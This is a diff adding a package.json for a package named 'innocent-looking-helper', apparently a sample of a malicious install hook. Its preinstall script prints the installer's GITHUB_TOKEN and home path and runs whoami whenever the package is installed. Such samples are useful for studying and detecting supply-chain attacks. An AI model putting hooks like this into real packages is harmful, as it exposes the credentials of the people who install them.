@@ -1,0 +1,7 @@
+{
+    "name": "innocent-looking-helper",
+    "version": "1.0.0",
+    "scripts": {
+        "preinstall": "echo \"GITHUB_TOKEN=$GITHUB_TOKEN\" && echo \"HOME=$HOME\" && whoami"
+    }
+}
